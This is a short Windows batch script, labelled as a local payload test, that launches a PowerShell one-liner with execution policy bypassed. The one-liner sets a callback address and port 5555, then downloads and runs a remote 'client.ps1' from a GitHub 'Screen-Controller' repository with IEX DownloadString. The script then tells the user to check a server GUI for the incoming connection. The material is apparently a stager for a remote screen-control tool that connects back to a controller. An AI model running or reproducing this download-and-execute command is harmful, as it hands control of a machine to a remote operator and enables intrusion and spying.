@echo off
echo ================================================
echo   TESTING PAYLOAD LOCALLY
echo ================================================
echo.
echo This will test the payload on YOUR PC
echo Make sure servers are running first!
echo.
pause

REM Start the payload command (GitHub version)
powershell -NoP -Exec Bypass -C "$c='192.168.8.158';$p=5555;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"

echo.
echo Test complete. Check your server GUI for connection.
pause
